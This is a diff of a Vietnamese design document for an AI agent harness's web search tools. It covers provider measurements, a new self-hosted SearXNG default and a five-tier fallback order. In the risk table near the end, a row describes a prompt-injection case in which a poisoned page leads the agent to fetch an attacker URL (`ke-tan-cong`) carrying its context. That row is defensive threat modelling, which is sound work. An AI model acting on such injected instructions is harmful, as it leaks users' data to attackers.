@@ -5,6 +5,13 @@
 > "plan xong chưa có cơ chế tra cứu mạng". Quyết định của chủ dự án: *"Nghiên cứu các
 > công cụ search, fetch vì không có API key của Brave. Các công cụ free. Làm công cụ ở
 > tầng host."*
+>
+> **Cập nhật 2026-10-06 (PART 1 — "cài xong là tìm được, không khoá"):** câu kết luận cũ ở §2.1
+> ("không có máy tìm kiếm web tổng quát nào miễn phí và không khoá mà đáng tin") nay chỉ còn đúng cho
+> **instance công khai / HTML front-end**; **SearXNG tự host trên loopback** là chân không-khoá
+> **mặc định** (bậc 3) và đã đo sống — xem §2.2. Thứ tự 5 bậc + vị trí ống 10 bước: §3. Bản ghi quyết
+> định: [`docs/plan/builtin-search-default.md`](../plan/builtin-search-default.md); vận hành:
+> [`deploy/searxng/README.md`](../../deploy/searxng/README.md).
 
 ## 1. Vì sao không đặt công cụ trong box
 
@@ -15,39 +22,71 @@
 | Host (nơi harness và router chạy) có Internet đầy đủ | Đặt công cụ ở host: box vẫn kín, chỉ phần văn bản đã cắt đi vào ngữ cảnh |
 | Box có công tắc mạng `/__box/network on|off` (mặc định tắt) | Vẫn giữ nguyên lựa chọn đó cho người dùng; công cụ web không cần nó |
 
-## 2. Đo các nhà cung cấp miễn phí, không khoá (2026-09-20, từ host)
+## 2. Đo các nhà cung cấp miễn phí, không khoá (từ host)
 
-| Điểm cuối | Khoá? | Kết quả đo | Kết luận |
-|---|---|---|---|
-| `POST https://api.firecrawl.dev/v1/search` | không | **200**, JSON `{success, data:[{url,title,description}]}` với truy vấn thật | **Nhà cung cấp mặc định** cho `source="web"` |
-| `api.search.brave.com` | cần | không gọi được (chủ dự án không có khoá) | Bật khi có `BRAVE_API_KEY` |
-| `api.tavily.com` | cần | không gọi được | Bật khi có `TAVILY_API_KEY` |
-| `html.duckduckgo.com/html/?q=` | không | 200 nhưng là trang thử thách bot (`anomaly-modal`), 0 kết quả phân tích được | loại |
-| `lite.duckduckgo.com/lite/` (GET/POST) | không | 202, trang thử thách | loại |
-| `api.duckduckgo.com/?format=json` | không | 200 nhưng Instant Answer rỗng cho truy vấn thường | loại |
-| `www.mojeek.com/search` | không | **403** kể cả khi giả User-Agent Chrome | loại |
-| `searx.be/search?format=json` và 7 bản SearXNG khác | không | JSON bị tắt (trả HTML) hoặc **429** / "Making sure you're not a bot!" | loại |
-| `s.jina.ai` (search) | cần | 401 `AuthenticationRequiredError` | loại |
-| `api.marginalia.nu`, `freeserp.ai/api/...` | không | 404 / 302, không có API công khai | loại |
-| `en.wikipedia.org/w/api.php?list=search` | không | **200**, JSON có tiêu đề + đoạn trích | `source="wikipedia"` |
-| `api.stackexchange.com/2.3/search/advanced` | không | **200**, JSON có `is_answered`, `score`, thân bài | `source="stackoverflow"` |
-| `api.github.com/search/repositories` | không (60 lượt/giờ) | **200**, JSON | `source="github"` |
-| `api.openalex.org/works?search=` | không | **200**, JSON (bài báo, DOI, số trích dẫn) | `source="papers"`; chân **đầu** của chuỗi học thuật, cũng là xương sống của `paper_citations` (A-6) |
-| `api.crossref.org/works?query.bibliographic=` | không (`mailto`) | **200**; **429 rồi 200** cùng phiên ⇒ phải có `_retry` | chân 2 của `source="papers"` (A-6) |
-| `www.ebi.ac.uk/europepmc/webservices/rest/search` | không | **200** rồi **503** cùng phiên ⇒ phải có `_retry`; phủ y–sinh | chân 3 của `source="papers"` (A-6) |
-| `export.arxiv.org/api/query` | không | **406** cho `all:referral` (3 lần) mà **200** cho `all:electron` cùng phiên | chân **cuối** của `source="papers"`; chập chờn nên không đứng trước (A-6) |
-| `api.exa.ai/search` | **cần** | không gọi được (chủ dự án không có khoá) | Chân 4 của `source="web"`, chỉ chạy khi có `EXA_API_KEY` (A-7) |
-| `api.parallel.ai/v1beta/search` | **cần** | không gọi được | Chân 5 của `source="web"`, chỉ chạy khi có `PARALLEL_API_KEY` (A-7) |
-| `r.jina.ai/<url>` | không | **200**, Markdown có `Title:` và `Markdown Content:` | Bản dự phòng đọc trang khi bản chính bị chặn/thiếu chữ |
+Hai vòng đo: **2026-09-20** (bảng 2.1 — vòng quét đầu, chốt chuỗi) và **2026-10-06** (bảng 2.2 — đo
+lại khi làm PART 1). Số của vòng cũ **giữ nguyên, không viết lại**; chỗ nào bị vòng mới phủ định thì
+ghi rõ ngay dưới bảng.
 
-Kết luận: **không có máy tìm kiếm web tổng quát nào miễn phí và không khoá mà đáng tin**
-(ba nhà cung cấp thử thách bot, bảy bản SearXNG bị 429). Vì vậy thiết kế là một chuỗi:
+### 2.1 Vòng đo 2026-09-20
 
-1. `source="web"` → Firecrawl (không khoá) → Brave/Tavily/Exa/Parallel **nếu có khoá** (A-7);
+| Điểm cuối | Khoá? | Nguồn cấu hình (bậc §3, chốt 06/10/2026) | Kết quả đo | Kết luận |
+|---|---|---|---|---|
+| `POST https://api.firecrawl.dev/v1/search` | không | Settings → Provider → Web Search (bậc 1, nếu có credential) hoặc ENV `FIRECRAWL_API_KEY` (bậc 2); bản **không khoá** là bậc 4 | **200**, JSON `{success, data:[{url,title,description}]}` với truy vấn thật (20/09); **403/429** khi đo lại 06/10 ⇒ xem 2.2 | Chân **keyless** của `source="web"` (bậc 4) |
+| `api.search.brave.com` | cần | Settings/ENV `BRAVE_API_KEY`/`BOXFOX_BRAVE_API_KEY` (bậc 1–2) | không gọi được (chủ dự án không có khoá) | Bật khi có khoá |
+| `api.tavily.com` | cần | Settings/ENV `TAVILY_API_KEY` (bậc 1–2) | không gọi được | Bật khi có khoá |
+| `html.duckduckgo.com/html/?q=` | không | — (chỉ thử để loại) | 200 nhưng là trang thử thách bot (`anomaly-modal`), 0 kết quả phân tích được | loại |
+| `lite.duckduckgo.com/lite/` (GET/POST) | không | — | 202, trang thử thách | loại |
+| `api.duckduckgo.com/?format=json` | không | — | 200 nhưng Instant Answer rỗng cho truy vấn thường | loại |
+| `www.mojeek.com/search` | không | — | **403** kể cả khi giả User-Agent Chrome | loại |
+| `searx.be/search?format=json` và 7 bản SearXNG khác | không | — (instance **công khai**; tự host mới dùng — bậc 3, xem 2.2) | JSON bị tắt (trả HTML) hoặc **429** / "Making sure you're not a bot!" | loại |
+| `s.jina.ai` (search) | cần | — | 401 `AuthenticationRequiredError` | loại |
+| `api.marginalia.nu`, `freeserp.ai/api/...` | không | — | 404 / 302, không có API công khai | loại |
+| `en.wikipedia.org/w/api.php?list=search` | không | `source="wikipedia"` | **200**, JSON có tiêu đề + đoạn trích | nguồn chuyên biệt, không khoá |
+| `api.stackexchange.com/2.3/search/advanced` | không | `source="stackoverflow"` | **200**, JSON có `is_answered`, `score`, thân bài | nguồn chuyên biệt, không khoá |
+| `api.github.com/search/repositories` | không (60 lượt/giờ) | `source="github"` | **200**, JSON | nguồn chuyên biệt, không khoá |
+| `api.openalex.org/works?search=` | không | `source="papers"` | **200**, JSON (bài báo, DOI, số trích dẫn) | chân **đầu** của chuỗi học thuật, cũng là xương sống của `paper_citations` (A-6) |
+| `api.crossref.org/works?query.bibliographic=` | không (`mailto`) | `source="papers"` | **200**; **429 rồi 200** cùng phiên ⇒ phải có `_retry` | chân 2 của chuỗi học thuật (A-6) |
+| `www.ebi.ac.uk/europepmc/webservices/rest/search` | không | `source="papers"` | **200** rồi **503** cùng phiên ⇒ phải có `_retry`; phủ y–sinh | chân 3 của chuỗi học thuật (A-6) |
+| `export.arxiv.org/api/query` | không | `source="papers"` | **406** cho `all:referral` (3 lần) mà **200** cho `all:electron` cùng phiên | chân **cuối** của chuỗi học thuật (A-6) |
+| `api.exa.ai/search` | **cần** | Settings/ENV `EXA_API_KEY` (bậc 1–2) | không gọi được (chủ dự án không có khoá) | Chân 4 của `source="web"`, chỉ chạy khi có khoá (A-7) |
+| `api.parallel.ai/v1beta/search` | **cần** | Settings/ENV `PARALLEL_API_KEY` (bậc 1–2) | không gọi được | Chân 5 của `source="web"`, chỉ chạy khi có khoá (A-7) |
+| `POST https://api.cloudflare.com/client/v4/accounts/{account_id}/ai/websearch/` | **cần** (Account ID + token) | Settings → Provider → Web Search (bậc 1); catalog **không** có biến ENV cho mục này | không gọi được (chủ dự án không có khoá) | Chân mới của `source="web"` (PART 2): đọc `items[]` → `{title, url, snippet}` |
+| endpoint tự khai của người dùng (`custom`) | tuỳ chọn (chỉ endpoint là bắt buộc) | Settings → Provider → Web Search (bậc 1) | chưa đo | Chân mới của `source="web"` (PART 2): POST truy vấn kèm `Authorization: Bearer`, tự nhận `results[]` hoặc `items[]` |
+| `r.jina.ai/<url>` | không | — (đầu đọc, không phải tìm kiếm) | **200**, Markdown có `Title:` và `Markdown Content:` | Bản dự phòng đọc trang khi bản chính bị chặn/thiếu chữ |
+
+### 2.2 Vòng đo 2026-10-06 — SearXNG tự host thành chân mặc định không khoá
+
+| Phép đo | Nguồn cấu hình | Kết quả đo |
+|---|---|---|
+| `GET http://127.0.0.1:8888/healthz` (image `searxng/searxng:latest`, port-mapping `127.0.0.1:8888:8888`) | **tự dò** — không cần biến | **200 `OK`** — dùng làm đầu dò tự dò |
+| `searxng_search(...)` gọi thẳng | env `BOXFOX_SEARXNG_URL` hoặc tự dò | **251 ms**, **3 hàng** |
+| `deploy/searxng/probe.py` (không khoá) | như trên | mã thoát **0**; `google cse` 14 hàng + `bing` 10 hàng (24 hàng, 542 ms); `brave` **429** "Suspended: too many requests"; `duckduckgo`/`qwant` **CAPTCHA**; `google` "Suspended: access denied" (403) từ IP trung tâm dữ liệu |
+| Ống 10 bước với SearXNG thật, không khoá | `BOXFOX_SEARCH_PIPELINE=on` | **5 kết quả trong 0,3 s** |
+| Chân `_provider_searxng` (chuỗi cũ), không khoá | `BOXFOX_SEARCH_PIPELINE=off` | **5 hàng trong 0,2 s**, `provider=searxng` |
+| Firecrawl không khoá (đường mặc định cũ) | bậc 4 | **403/429** liên tục — đúng F05 (`docs/plan/Work-Graph-fix.md`, hàng F05); đây **không** phải lỗi truy vấn |
+| 8 instance SearXNG công khai + HTML front-end | — | 429 / bot check / 403 ⇒ **loại** (không đổi so với 20/09) |
+
+**Câu kết luận cũ ở §2.1 (nguyên văn):** *"không có máy tìm kiếm web tổng quát nào miễn phí và không
+khoá mà đáng tin (ba nhà cung cấp thử thách bot, bảy bản SearXNG bị 429)"* — **vòng đo 06/10/2026 phủ
+định một phần, nói thẳng:**
+
+- Đúng cho **instance công khai** và **HTML front-end**: vẫn 429 / bot check / 403;
+- **Sai cho SearXNG tự host trên loopback**: nó là máy tìm kiếm web tổng quát, miễn phí, không khoá, và
+  đáng tin *ở mức đo được hôm nay* — chân **mặc định** của `source="web"` khi máy có nó (bậc 3).
+  Bật bằng `bash deploy/searxng/up.sh`; harness **tự dò** `127.0.0.1:8888` nên không cần biến và
+  không cần khởi động lại. Vận hành đầy đủ: `deploy/searxng/README.md`.
+
+Chuỗi thiết kế cũ giữ nguyên hiệu lực cho các bậc 1/2/4, chỉ **chèn thêm bậc 3**:
+
+1. `source="web"` → **bậc 1** Settings → **bậc 2** Brave/Tavily/Exa/Parallel nếu có khoá (A-7) →
+   **bậc 3** SearXNG tự host (mới, 06/10/2026) → **bậc 4** Firecrawl không khoá;
 2. nếu tất cả bị từ chối → lỗi `WEB_SEARCH_UNAVAILABLE` **nói rõ** và gợi ý dùng
-   `source="wikipedia"|"stackoverflow"|"github"|"papers"` hoặc `web_fetch` một URL đã biết;
-   từ A-7, thông điệp này **kể tên khoá thiếu** (`Set one of BRAVE_API_KEY|BOXFOX_BRAVE_API_KEY, …`)
-   thay vì chỉ nói "mọi nhà cung cấp đều từ chối";
+   `source="wikipedia"|"stackoverflow"|"github"|"papers"` hoặc `web_fetch` một URL đã biết; từ A-7,
+   thông điệp này **kể tên khoá thiếu** (`Set one of BRAVE_API_KEY|BOXFOX_BRAVE_API_KEY, …`) thay vì
+   chỉ nói "mọi nhà cung cấp đều từ chối"; từ 06/10/2026 nó còn **phân loại** `searchFailure.kind` =
+   `config`/`infra`/`source` và nói thẳng "not a query problem" cho hai ca đầu — xem §3 và
+   `docs/plan/builtin-search-default.md` §4;
 3. bốn nguồn chuyên biệt ở trên trả JSON ổn định, không cần khoá; `source="papers"` là một **chuỗi
    bốn chân** (OpenAlex → Crossref → Europe PMC → arXiv, A-6).
 
@@ -64,6 +103,9 @@ Kết luận: **không có máy tìm kiếm web tổng quát nào miễn phí v�
 | Nhật ký DEV | `web.search`, `web.fetch`, `web.error`, `web.retry` (chỉ số đếm, mã lỗi, thời gian — **không** nội dung truy vấn; `web.retry` mang đúng `attempt` + `code`) | điều tra được mà không rò dữ liệu; ranh giới này áp cho **mọi** đường ghi nhật ký, kể cả dòng `tool.error` chung (`WebError.log_message` + `failures.log_safe_failure`) — vòng soát mã đợt 10 bắt được nhánh lỗi còn ghi nguyên câu có truy vấn và URL |
 | Rủi ro còn lại: kênh ra | `web_fetch` là kênh GET ra ngoài, giữ bởi cả `orchestrator` và `research` — một trang bị tiêm nhiễm có thể xúi agent tải `https://ke-tan-cong/?<ngữ cảnh>` | đây là chiều RÒ RA, khác với chiều nội dung bẩn vào; nhãn untrusted không chặn được nó. Giảm nhẹ đang có: chỉ `http(s)`, trần 2 MiB, danh sách đích công khai; muốn chặt hơn thì bỏ `web_*` khỏi `ORCHESTRATOR_TOOLS`, hoặc thêm danh sách đích cho phép |
 | Rủi ro còn lại | orchestrator giữ `terminal_exec` mà cũng đọc được nội dung web | đã chọn theo yêu cầu; giảm nhẹ bằng nhãn untrusted + ranh giới rõ trong mô tả công cụ; nếu muốn chặt hơn thì bỏ `web_*` khỏi `ORCHESTRATOR_TOOLS` và buộc đi qua `research` |
+| **Thứ tự nguồn tìm kiếm** (chốt 06/10/2026) | **Năm bậc**: (1) nguồn chọn ở **Settings → Provider → Web Search** (có credential) → (2) khoá ENV `BRAVE_API_KEY`/`BOXFOX_BRAVE_API_KEY` → `TAVILY_API_KEY` → `EXA_API_KEY` → `PARALLEL_API_KEY` → `FIRECRAWL_API_KEY` → (3) **SearXNG tự host** (env `BOXFOX_SEARXNG_URL` → tự dò `127.0.0.1:8888`) → (4) Firecrawl **không khoá** → (5) lỗi đã phân loại `WEB_SEARCH_UNAVAILABLE` (`searchFailure.kind` = `config\|infra\|source`) / `WEB_SEARCH_EMPTY` | bậc 3 là chân **không khoá mặc định** mới đo được 06/10/2026 (§2.2); bậc 1/2 **thắng** bậc 3 nên ai đã có khoá/chọn nguồn không bị đổi hành vi; hợp đồng đầy đủ ở [`docs/plan/builtin-search-default.md`](../plan/builtin-search-default.md) §4 |
+| **Đường ống 10 bước** (vị trí) | `BOXFOX_SEARCH_PIPELINE` = `auto` (mặc định) \| `on` \| `off`; khi chạy, ống **hiện thực bậc 3** cho `source="web"`: `auto` chỉ chạy khi SearXNG sống ∧ **không** cấu hình tường minh (bậc 1/2); `on` chạy trước cả bậc 1/2; ống không ra kết quả ⇒ rơi xuống phần còn lại của chuỗi **một lần**, payload ghi `searchFallback` | `auto` giữ đúng thứ tự ưu tiên (không phá hợp đồng với tab Settings); `off` là **công tắc giết** một dòng, không cần build lại; `pipeline_enabled()` giữ nghĩa cũ (`on`) cho nhánh `papers` |
+| **Quan sát trạng thái** (06/10/2026) | `GET /api/agent/health` khối `search` (rẻ, **không gọi mạng**; `?probe=search` mới dò thật) + `runtime-info.search`; `python3 deploy/searxng/probe.py [--json]` cho phán quyết theo engine | người vận hành trả lời được "SearXNG sống? engine nào bị chặn? đang dùng nguồn nào? có đang rơi dự phòng không?" mà không phải đọc log hay đoán |
 
 ## 4. Vòng 27 — lớp đọc nguồn (đợt 1 xong 2026-09-23)
 
